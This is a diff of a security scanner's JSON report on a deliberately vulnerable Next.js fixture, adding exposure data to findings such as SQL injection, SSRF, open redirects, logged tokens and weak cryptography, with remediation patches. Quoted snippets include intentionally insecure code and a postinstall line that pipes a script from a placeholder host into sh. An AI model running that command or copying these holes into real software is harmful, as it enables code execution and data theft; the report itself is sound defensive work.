@@ -20,6 +20,12 @@
     "low": 0,
     "info": 0
   },
+  "exposureSummary": {
+    "internet": 12,
+    "authenticated": 0,
+    "internal": 4,
+    "unknown": 5
+  },
   "findings": [
     {
       "id": "sql-injection",
@@ -27,6 +33,11 @@
       "confidence": "likely",
       "owasp": "A03:2021",
       "cwe": 89,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/login",
+        "reason": "no authentication gate identified on this path"
+      },
       "title": "SQL query built by string interpolation",
       "why": "A value taken from the request is interpolated into SQL, so the caller controls part of the statement. That is enough to read other users' rows, bypass a WHERE clause, or drop a table.",
       "location": {
@@ -91,6 +102,11 @@
       "confidence": "likely",
       "owasp": "A10:2021",
       "cwe": 918,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/proxy",
+        "reason": "no authentication gate identified on this path"
+      },
       "title": "Server fetches a URL the caller controls",
       "why": "The destination of this request comes from the caller, so they choose which host the server connects to. That includes hosts they cannot reach themselves: the cloud metadata endpoint that hands out IAM credentials, internal services that skip authentication because they are 'not exposed', and anything bound to localhost.",
       "location": {
@@ -157,6 +173,11 @@
       "confidence": "likely",
       "owasp": "A10:2021",
       "cwe": 918,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/proxy",
+        "reason": "no authentication gate identified on this path"
+      },
       "title": "Server fetches a URL the caller controls",
       "why": "The destination of this request comes from the caller, so they choose which host the server connects to. That includes hosts they cannot reach themselves: the cloud metadata endpoint that hands out IAM credentials, internal services that skip authentication because they are 'not exposed', and anything bound to localhost.",
       "location": {
@@ -223,6 +244,11 @@
       "confidence": "likely",
       "owasp": "A10:2021",
       "cwe": 918,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/proxy",
+        "reason": "no authentication gate identified on this path"
+      },
       "title": "Server fetches a URL the caller controls",
       "why": "The destination of this request comes from the caller, so they choose which host the server connects to. That includes hosts they cannot reach themselves: the cloud metadata endpoint that hands out IAM credentials, internal services that skip authentication because they are 'not exposed', and anything bound to localhost.",
       "location": {
@@ -289,6 +315,11 @@
       "confidence": "likely",
       "owasp": "A10:2021",
       "cwe": 918,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/proxy",
+        "reason": "no authentication gate identified on this path"
+      },
       "title": "Server fetches a URL the caller controls",
       "why": "The destination of this request comes from the caller, so they choose which host the server connects to. That includes hosts they cannot reach themselves: the cloud metadata endpoint that hands out IAM credentials, internal services that skip authentication because they are 'not exposed', and anything bound to localhost.",
       "location": {
@@ -355,6 +386,11 @@
       "confidence": "likely",
       "owasp": "A05:2021",
       "cwe": 209,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/users",
+        "reason": "no authentication gate identified on this path"
+      },
       "title": "Stack trace leaked in error response",
       "why": "Stack traces expose absolute file paths, dependency versions, and internal call structure — enough to fingerprint the stack and locate other weaknesses.",
       "location": {
@@ -417,11 +453,659 @@
       ]
     },
     {
+      "id": "open-redirect",
+      "severity": "medium",
+      "confidence": "likely",
+      "owasp": "A01:2021",
+      "cwe": 601,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/proxy",
+        "reason": "no authentication gate identified on this path"
+      },
+      "title": "Redirect target comes from the caller",
+      "why": "The whole redirect target comes from the request, so a link to this endpoint can send a visitor anywhere. The URL they click genuinely belongs to you, which is what makes the page they land on convincing — and on an OAuth callback the authorisation code goes with them.",
+      "location": {
+        "path": "app/api/proxy/route.ts",
+        "line": 50,
+        "col": 5
+      },
+      "snippet": {
+        "path": "app/api/proxy/route.ts",
+        "startLine": 48,
+        "lines": [
+          "  // open-redirect",
+          "  if (next) {",
+          "    redirect(next)",
+          "  }"
+        ],
+        "highlight": {
+          "line": 50,
+          "startCol": 5,
+          "endCol": 19,
+          "label": "destination chosen by the caller"
+        }
+      },
+      "context": {
+        "framework": "next",
+        "route": "/api/proxy",
+        "evidence": "redirect target is caller-controlled"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Validate before calling redirect(); request.nextUrl.origin is the base.",
+          "patch": "import { redirect } from 'next/navigation'\n\nconst next = request.nextUrl.searchParams.get('next')\nredirect(safeRedirect(next, request.nextUrl.origin))",
+          "safety": "manual"
+        },
+        {
+          "summary": "Resolve the target against your own origin and refuse anything that lands elsewhere. Do not use a startsWith('/') check: '//evil.com' passes it and leaves the site.",
+          "patch": "// lib/safe-redirect.ts\nexport function safeRedirect(target: unknown, base: string, fallback = '/'): string {\n  if (typeof target !== 'string') return fallback\n  try {\n    const resolved = new URL(target, base)\n    // Same origin only. This rejects '//evil.com', 'https://evil.com',\n    // and 'javascript:' alike. A leading-slash test does not: the browser\n    // reads '//evil.com' as a URL to another host.\n    return resolved.origin === new URL(base).origin ? resolved.pathname + resolved.search : fallback\n  } catch {\n    return fallback\n  }\n}",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A01:2021",
+          "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-601",
+          "url": "https://cwe.mitre.org/data/definitions/601.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#open-redirect",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#open-redirect"
+        }
+      ]
+    },
+    {
+      "id": "open-redirect",
+      "severity": "medium",
+      "confidence": "likely",
+      "owasp": "A01:2021",
+      "cwe": 601,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/proxy",
+        "reason": "no authentication gate identified on this path"
+      },
+      "title": "Redirect target comes from the caller",
+      "why": "The whole redirect target comes from the request, so a link to this endpoint can send a visitor anywhere. The URL they click genuinely belongs to you, which is what makes the page they land on convincing — and on an OAuth callback the authorisation code goes with them.",
+      "location": {
+        "path": "app/api/proxy/route.ts",
+        "line": 56,
+        "col": 5
+      },
+      "snippet": {
+        "path": "app/api/proxy/route.ts",
+        "startLine": 54,
+        "lines": [
+          "  const extraNext = url.searchParams.get('extraNext')",
+          "  if (extraNext) {",
+          "    redirect(extraNext)",
+          "  }"
+        ],
+        "highlight": {
+          "line": 56,
+          "startCol": 5,
+          "endCol": 24,
+          "label": "destination chosen by the caller"
+        }
+      },
+      "context": {
+        "framework": "next",
+        "route": "/api/proxy",
+        "evidence": "redirect target is caller-controlled"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Validate before calling redirect(); request.nextUrl.origin is the base.",
+          "patch": "import { redirect } from 'next/navigation'\n\nconst next = request.nextUrl.searchParams.get('next')\nredirect(safeRedirect(next, request.nextUrl.origin))",
+          "safety": "manual"
+        },
+        {
+          "summary": "Resolve the target against your own origin and refuse anything that lands elsewhere. Do not use a startsWith('/') check: '//evil.com' passes it and leaves the site.",
+          "patch": "// lib/safe-redirect.ts\nexport function safeRedirect(target: unknown, base: string, fallback = '/'): string {\n  if (typeof target !== 'string') return fallback\n  try {\n    const resolved = new URL(target, base)\n    // Same origin only. This rejects '//evil.com', 'https://evil.com',\n    // and 'javascript:' alike. A leading-slash test does not: the browser\n    // reads '//evil.com' as a URL to another host.\n    return resolved.origin === new URL(base).origin ? resolved.pathname + resolved.search : fallback\n  } catch {\n    return fallback\n  }\n}",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A01:2021",
+          "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-601",
+          "url": "https://cwe.mitre.org/data/definitions/601.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#open-redirect",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#open-redirect"
+        }
+      ]
+    },
+    {
+      "id": "open-redirect",
+      "severity": "medium",
+      "confidence": "likely",
+      "owasp": "A01:2021",
+      "cwe": 601,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/proxy",
+        "reason": "no authentication gate identified on this path"
+      },
+      "title": "Redirect target comes from the caller",
+      "why": "The whole redirect target comes from the request, so a link to this endpoint can send a visitor anywhere. The URL they click genuinely belongs to you, which is what makes the page they land on convincing — and on an OAuth callback the authorisation code goes with them.",
+      "location": {
+        "path": "app/api/proxy/route.ts",
+        "line": 62,
+        "col": 5
+      },
+      "snippet": {
+        "path": "app/api/proxy/route.ts",
+        "startLine": 60,
+        "lines": [
+          "  if (manualNext) {",
+          "    const headers = new Headers()",
+          "    headers.set('Location', manualNext)",
+          "    return new NextResponse(null, { status: 302, headers })",
+          "  }"
+        ],
+        "highlight": {
+          "line": 62,
+          "startCol": 5,
+          "endCol": 40,
+          "label": "destination chosen by the caller"
+        }
+      },
+      "context": {
+        "framework": "next",
+        "route": "/api/proxy",
+        "evidence": "redirect target is caller-controlled"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Validate before calling redirect(); request.nextUrl.origin is the base.",
+          "patch": "import { redirect } from 'next/navigation'\n\nconst next = request.nextUrl.searchParams.get('next')\nredirect(safeRedirect(next, request.nextUrl.origin))",
+          "safety": "manual"
+        },
+        {
+          "summary": "Resolve the target against your own origin and refuse anything that lands elsewhere. Do not use a startsWith('/') check: '//evil.com' passes it and leaves the site.",
+          "patch": "// lib/safe-redirect.ts\nexport function safeRedirect(target: unknown, base: string, fallback = '/'): string {\n  if (typeof target !== 'string') return fallback\n  try {\n    const resolved = new URL(target, base)\n    // Same origin only. This rejects '//evil.com', 'https://evil.com',\n    // and 'javascript:' alike. A leading-slash test does not: the browser\n    // reads '//evil.com' as a URL to another host.\n    return resolved.origin === new URL(base).origin ? resolved.pathname + resolved.search : fallback\n  } catch {\n    return fallback\n  }\n}",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A01:2021",
+          "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-601",
+          "url": "https://cwe.mitre.org/data/definitions/601.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#open-redirect",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#open-redirect"
+        }
+      ]
+    },
+    {
+      "id": "sensitive-data-logged",
+      "severity": "medium",
+      "confidence": "likely",
+      "owasp": "A09:2021",
+      "cwe": 532,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/users",
+        "reason": "no authentication gate identified on this path"
+      },
+      "title": "Sensitive data written to a log",
+      "why": "Logs are copied into aggregators, retained for months, and readable by anyone with access to the logging system. A credential that reaches a log has left the application's trust boundary.",
+      "location": {
+        "path": "app/api/users/route.ts",
+        "line": 11,
+        "col": 18
+      },
+      "snippet": {
+        "path": "app/api/users/route.ts",
+        "startLine": 9,
+        "lines": [
+          "export async function GET(request: Request) {",
+          "  // sensitive-data-logged: the Authorization header lands in the log aggregator.",
+          "  console.info({ authorization: request.headers.get('authorization') })",
+          "  // sensitive-data-logged: the caller's access token, logged the same way.",
+          "  const accessToken = request.headers.get('x-access-token')"
+        ],
+        "highlight": {
+          "line": 11,
+          "startCol": 18,
+          "endCol": 69,
+          "label": "sensitive value written to a log"
+        }
+      },
+      "context": {
+        "framework": "next",
+        "route": "/api/users",
+        "evidence": "authorization: …"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Log that the attempt happened, not the credential.",
+          "patch": "console.info({ event: 'login_attempt', userId })\n// never: console.info({ password })",
+          "safety": "manual"
+        },
+        {
+          "summary": "Log a redacted shape — an id, a boolean, a length — never the secret itself.",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A09:2021",
+          "url": "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-532",
+          "url": "https://cwe.mitre.org/data/definitions/532.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#sensitive-data-logged",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#sensitive-data-logged"
+        }
+      ]
+    },
+    {
+      "id": "sensitive-data-logged",
+      "severity": "medium",
+      "confidence": "likely",
+      "owasp": "A09:2021",
+      "cwe": 532,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/users",
+        "reason": "no authentication gate identified on this path"
+      },
+      "title": "Sensitive data written to a log",
+      "why": "Logs are copied into aggregators, retained for months, and readable by anyone with access to the logging system. A credential that reaches a log has left the application's trust boundary.",
+      "location": {
+        "path": "app/api/users/route.ts",
+        "line": 14,
+        "col": 18
+      },
+      "snippet": {
+        "path": "app/api/users/route.ts",
+        "startLine": 12,
+        "lines": [
+          "  // sensitive-data-logged: the caller's access token, logged the same way.",
+          "  const accessToken = request.headers.get('x-access-token')",
+          "  console.info({ accessToken })",
+          "  try {",
+          "    const users = await listUsers()"
+        ],
+        "highlight": {
+          "line": 14,
+          "startCol": 18,
+          "endCol": 29,
+          "label": "sensitive value written to a log"
+        }
+      },
+      "context": {
+        "framework": "next",
+        "route": "/api/users",
+        "evidence": "accessToken: …"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Log that the attempt happened, not the credential.",
+          "patch": "console.info({ event: 'login_attempt', userId })\n// never: console.info({ password })",
+          "safety": "manual"
+        },
+        {
+          "summary": "Log a redacted shape — an id, a boolean, a length — never the secret itself.",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A09:2021",
+          "url": "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-532",
+          "url": "https://cwe.mitre.org/data/definitions/532.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#sensitive-data-logged",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#sensitive-data-logged"
+        }
+      ]
+    },
+    {
+      "id": "insecure-cookie",
+      "severity": "medium",
+      "confidence": "possible",
+      "owasp": "A05:2021",
+      "cwe": 614,
+      "exposure": "internet",
+      "exposureEvidence": {
+        "route": "/api/login",
+        "reason": "no authentication gate identified on this path"
+      },
+      "title": "Cookie set without its protective attributes",
+      "why": "This cookie is missing protections: httpOnly keeps the cookie out of reach of JavaScript, so a cross-site scripting bug cannot read the session; secure stops the cookie being sent over plain HTTP; sameSite stops the browser attaching the cookie to cross-site requests.",
+      "location": {
+        "path": "app/api/login/route.ts",
+        "line": 20,
+        "col": 3
+      },
+      "snippet": {
+        "path": "app/api/login/route.ts",
+        "startLine": 18,
+        "lines": [
+          "",
+          "  // insecure-cookie: Next's cookies().set with no attributes.",
+          "  cookies().set('session', rows.rows[0]?.id ?? 'anon')",
+          "",
+          "  return NextResponse.json({ ok: true })"
+        ],
+        "highlight": {
+          "line": 20,
+          "startCol": 3,
+          "endCol": 55,
+          "label": "cookie written without httpOnly/secure/sameSite"
+        }
+      },
+      "context": {
+        "framework": "next",
+        "route": "/api/login",
+        "evidence": "no cookie options passed"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Pass the attributes to the cookie store.",
+          "patch": "cookies().set('session', token, {\n  httpOnly: true,\n  secure: process.env.NODE_ENV === 'production',\n  sameSite: 'lax',\n  path: '/',\n})",
+          "safety": "manual"
+        },
+        {
+          "summary": "Set httpOnly, secure, and sameSite when writing a cookie that carries anything the user would not want read or replayed.",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A05:2021",
+          "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-614",
+          "url": "https://cwe.mitre.org/data/definitions/614.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#insecure-cookie",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#insecure-cookie"
+        }
+      ]
+    },
+    {
+      "id": "ci-unpinned-action",
+      "severity": "medium",
+      "confidence": "likely",
+      "owasp": "A08:2021",
+      "cwe": 829,
+      "exposure": "internal",
+      "exposureEvidence": {
+        "reason": "not on a request-handling path"
+      },
+      "title": "GitHub Action is not pinned to a commit SHA",
+      "why": "A moving tag can be retargeted to a different commit. Anyone who can push that tag — or who compromises the action's repository — runs code in your CI with access to repository secrets.",
+      "location": {
+        "path": ".github/workflows/ci.yml",
+        "line": 8,
+        "col": 1
+      },
+      "context": {
+        "framework": "next",
+        "evidence": "actions/checkout@v4"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Pin the action to a full commit SHA (keep the tag in a comment for humans).",
+          "patch": "uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1",
+          "safety": "manual"
+        },
+        {
+          "summary": "Pin the action to a full commit SHA (keep the tag in a comment for humans).",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A08:2021",
+          "url": "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-829",
+          "url": "https://cwe.mitre.org/data/definitions/829.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#ci-unpinned-action",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#ci-unpinned-action"
+        }
+      ]
+    },
+    {
+      "id": "install-lifecycle-script",
+      "severity": "medium",
+      "confidence": "likely",
+      "owasp": "A08:2021",
+      "asi": "ASI04",
+      "cwe": 829,
+      "exposure": "internal",
+      "exposureEvidence": {
+        "reason": "not on a request-handling path"
+      },
+      "title": "Package declares an install-time script",
+      "why": "`postinstall` runs for everyone who installs this package, before any code is reviewed and often inside CI with credentials in the environment. This is the mechanism a compromised package uses to spread.",
+      "location": {
+        "path": "package.json",
+        "line": 7,
+        "col": 5
+      },
+      "snippet": {
+        "path": "package.json",
+        "startLine": 5,
+        "lines": [
+          "  \"description\": \"Deliberately vulnerable Next.js App Router fixture. Never deploy this.\",",
+          "  \"scripts\": {",
+          "    \"postinstall\": \"curl -s https://cdn.example.invalid/setup.sh | sh\"",
+          "  },",
+          "  \"dependencies\": {"
+        ],
+        "highlight": {
+          "line": 7,
+          "startCol": 20,
+          "endCol": 71,
+          "label": "runs automatically on install (postinstall)"
+        }
+      },
+      "context": {
+        "framework": "next",
+        "evidence": "curl -s https://cdn.example.invalid/setup.sh | sh"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Move the work into an explicit script the developer runs (`pnpm setup`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve.",
+          "patch": "// package.json\n\"scripts\": { \"prepare\": \"next build\" }\n// and: pnpm config set ignore-scripts true",
+          "safety": "manual"
+        },
+        {
+          "summary": "Move the work into an explicit script the developer runs (`pnpm setup`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve.",
+          "patch": "\"scripts\": { \"setup\": \"node scripts/setup.mjs\" }  // not postinstall",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A08:2021",
+          "url": "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-829",
+          "url": "https://cwe.mitre.org/data/definitions/829.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#install-lifecycle-script",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#install-lifecycle-script"
+        }
+      ]
+    },
+    {
+      "id": "unpinned-dependency",
+      "severity": "medium",
+      "confidence": "likely",
+      "owasp": "A06:2021",
+      "cwe": 1104,
+      "exposure": "internal",
+      "exposureEvidence": {
+        "reason": "not on a request-handling path"
+      },
+      "title": "Dependency version is unpinned",
+      "why": "An unpinned range lets the next install resolve a different major version, including one with a known vulnerability or a breaking API change, without anyone reviewing the bump.",
+      "location": {
+        "path": "package.json",
+        "line": 14,
+        "col": 1
+      },
+      "context": {
+        "framework": "next",
+        "evidence": "left-pad: *"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Pin the dependency in package.json and reinstall so the lockfile records it.",
+          "patch": "{\n  \"dependencies\": {\n    \"next\": \"^14.2.0\"\n  }\n}",
+          "safety": "manual"
+        },
+        {
+          "summary": "Replace '*' or 'latest' with a lower-bounded range (or an exact version), then regenerate the lockfile.",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A06:2021",
+          "url": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-1104",
+          "url": "https://cwe.mitre.org/data/definitions/1104.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#unpinned-dependency",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#unpinned-dependency"
+        }
+      ]
+    },
+    {
+      "id": "security-headers-missing",
+      "severity": "medium",
+      "confidence": "possible",
+      "owasp": "A05:2021",
+      "cwe": 693,
+      "exposure": "internal",
+      "exposureEvidence": {
+        "reason": "not on a request-handling path"
+      },
+      "title": "Security headers are not configured",
+      "why": "Without these headers the browser enforces nothing: strict-transport-security forces HTTPS for future requests; content-security-policy limits which scripts and origins the page may load; x-content-type-options stops browsers guessing a response's content type; x-frame-options blocks clickjacking via framing; referrer-policy stops URLs leaking to third parties.",
+      "location": {
+        "path": "package.json",
+        "line": 1,
+        "col": 1
+      },
+      "context": {
+        "framework": "next",
+        "evidence": "no header configuration found; missing: strict-transport-security, content-security-policy, x-content-type-options, x-frame-options, referrer-policy"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Add a headers() block to next.config.js.",
+          "patch": "// next.config.js\nmodule.exports = {\n  async headers() {\n    return [\n      {\n        source: '/:path*',\n        headers: [\n          { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains' },\n          { key: 'Content-Security-Policy', value: \"default-src 'self'\" },\n          { key: 'X-Content-Type-Options', value: 'nosniff' },\n          { key: 'X-Frame-Options', value: 'DENY' },\n          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },\n        ],\n      },\n    ]\n  },\n}",
+          "safety": "manual"
+        },
+        {
+          "summary": "Set these response headers at the edge or in the app: strict-transport-security, content-security-policy, x-content-type-options, x-frame-options, referrer-policy.",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A05:2021",
+          "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-693",
+          "url": "https://cwe.mitre.org/data/definitions/693.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#security-headers-missing",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#security-headers-missing"
+        }
+      ]
+    },
+    {
       "id": "hardcoded-secret",
       "severity": "high",
       "confidence": "likely",
       "owasp": "A07:2021",
       "cwe": 798,
+      "exposure": "unknown",
+      "exposureEvidence": {
+        "reason": "no route resolved for this file, and its path is not a recognised non-request location"
+      },
       "title": "Credential hardcoded in source",
       "why": "This literal carries the prefix of a Stripe live secret key, so it is a real credential rather than a placeholder. It is in the repository's history and in every clone; deleting the line does not revoke it.",
       "location": {
@@ -486,6 +1170,10 @@
       "confidence": "likely",
       "owasp": "A02:2021",
       "cwe": 327,
+      "exposure": "unknown",
+      "exposureEvidence": {
+        "reason": "no route resolved for this file, and its path is not a recognised non-request location"
+      },
       "title": "Broken cryptographic primitive protecting a secret",
       "why": "This hash is fast, and speed is the attacker's advantage: a commodity GPU tries billions of candidates a second, so a leaked table of these hashes is a leaked table of the values behind them. Password hashing needs a deliberately slow algorithm with a per-value salt.",
       "location": {
@@ -562,6 +1250,10 @@
       "confidence": "likely",
       "owasp": "A02:2021",
       "cwe": 327,
+      "exposure": "unknown",
+      "exposureEvidence": {
+        "reason": "no route resolved for this file, and its path is not a recognised non-request location"
+      },
       "title": "Broken cryptographic primitive protecting a secret",
       "why": "Math.random() is a fast PRNG, not a cryptographic one; V8 documents it as unsuitable for security. An attacker who sees a few outputs can predict the rest, which for a session id or a reset token means minting valid ones.",
       "location": {
@@ -627,6 +1319,10 @@
       "confidence": "likely",
       "owasp": "A02:2021",
       "cwe": 327,
+      "exposure": "unknown",
+      "exposureEvidence": {
+        "reason": "no route resolved for this file, and its path is not a recognised non-request location"
+      },
       "title": "Broken cryptographic primitive protecting a secret",
       "why": "This cipher or mode is broken independently of the key. DES has a keyspace small enough to search, RC4 has biased output, and ECB encrypts identical plaintext blocks to identical ciphertext blocks — the structure of the data survives encryption.",
       "location": {
@@ -687,384 +1383,15 @@
       ]
     },
     {
-      "id": "ci-unpinned-action",
-      "severity": "medium",
-      "confidence": "likely",
-      "owasp": "A08:2021",
-      "cwe": 829,
-      "title": "GitHub Action is not pinned to a commit SHA",
-      "why": "A moving tag can be retargeted to a different commit. Anyone who can push that tag — or who compromises the action's repository — runs code in your CI with access to repository secrets.",
-      "location": {
-        "path": ".github/workflows/ci.yml",
-        "line": 8,
-        "col": 1
-      },
-      "context": {
-        "framework": "next",
-        "evidence": "actions/checkout@v4"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Pin the action to a full commit SHA (keep the tag in a comment for humans).",
-          "patch": "uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1",
-          "safety": "manual"
-        },
-        {
-          "summary": "Pin the action to a full commit SHA (keep the tag in a comment for humans).",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A08:2021",
-          "url": "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-829",
-          "url": "https://cwe.mitre.org/data/definitions/829.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#ci-unpinned-action",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#ci-unpinned-action"
-        }
-      ]
-    },
-    {
-      "id": "open-redirect",
-      "severity": "medium",
-      "confidence": "likely",
-      "owasp": "A01:2021",
-      "cwe": 601,
-      "title": "Redirect target comes from the caller",
-      "why": "The whole redirect target comes from the request, so a link to this endpoint can send a visitor anywhere. The URL they click genuinely belongs to you, which is what makes the page they land on convincing — and on an OAuth callback the authorisation code goes with them.",
-      "location": {
-        "path": "app/api/proxy/route.ts",
-        "line": 50,
-        "col": 5
-      },
-      "snippet": {
-        "path": "app/api/proxy/route.ts",
-        "startLine": 48,
-        "lines": [
-          "  // open-redirect",
-          "  if (next) {",
-          "    redirect(next)",
-          "  }"
-        ],
-        "highlight": {
-          "line": 50,
-          "startCol": 5,
-          "endCol": 19,
-          "label": "destination chosen by the caller"
-        }
-      },
-      "context": {
-        "framework": "next",
-        "route": "/api/proxy",
-        "evidence": "redirect target is caller-controlled"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Validate before calling redirect(); request.nextUrl.origin is the base.",
-          "patch": "import { redirect } from 'next/navigation'\n\nconst next = request.nextUrl.searchParams.get('next')\nredirect(safeRedirect(next, request.nextUrl.origin))",
-          "safety": "manual"
-        },
-        {
-          "summary": "Resolve the target against your own origin and refuse anything that lands elsewhere. Do not use a startsWith('/') check: '//evil.com' passes it and leaves the site.",
-          "patch": "// lib/safe-redirect.ts\nexport function safeRedirect(target: unknown, base: string, fallback = '/'): string {\n  if (typeof target !== 'string') return fallback\n  try {\n    const resolved = new URL(target, base)\n    // Same origin only. This rejects '//evil.com', 'https://evil.com',\n    // and 'javascript:' alike. A leading-slash test does not: the browser\n    // reads '//evil.com' as a URL to another host.\n    return resolved.origin === new URL(base).origin ? resolved.pathname + resolved.search : fallback\n  } catch {\n    return fallback\n  }\n}",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A01:2021",
-          "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-601",
-          "url": "https://cwe.mitre.org/data/definitions/601.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#open-redirect",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#open-redirect"
-        }
-      ]
-    },
-    {
-      "id": "open-redirect",
-      "severity": "medium",
-      "confidence": "likely",
-      "owasp": "A01:2021",
-      "cwe": 601,
-      "title": "Redirect target comes from the caller",
-      "why": "The whole redirect target comes from the request, so a link to this endpoint can send a visitor anywhere. The URL they click genuinely belongs to you, which is what makes the page they land on convincing — and on an OAuth callback the authorisation code goes with them.",
-      "location": {
-        "path": "app/api/proxy/route.ts",
-        "line": 56,
-        "col": 5
-      },
-      "snippet": {
-        "path": "app/api/proxy/route.ts",
-        "startLine": 54,
-        "lines": [
-          "  const extraNext = url.searchParams.get('extraNext')",
-          "  if (extraNext) {",
-          "    redirect(extraNext)",
-          "  }"
-        ],
-        "highlight": {
-          "line": 56,
-          "startCol": 5,
-          "endCol": 24,
-          "label": "destination chosen by the caller"
-        }
-      },
-      "context": {
-        "framework": "next",
-        "route": "/api/proxy",
-        "evidence": "redirect target is caller-controlled"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Validate before calling redirect(); request.nextUrl.origin is the base.",
-          "patch": "import { redirect } from 'next/navigation'\n\nconst next = request.nextUrl.searchParams.get('next')\nredirect(safeRedirect(next, request.nextUrl.origin))",
-          "safety": "manual"
-        },
-        {
-          "summary": "Resolve the target against your own origin and refuse anything that lands elsewhere. Do not use a startsWith('/') check: '//evil.com' passes it and leaves the site.",
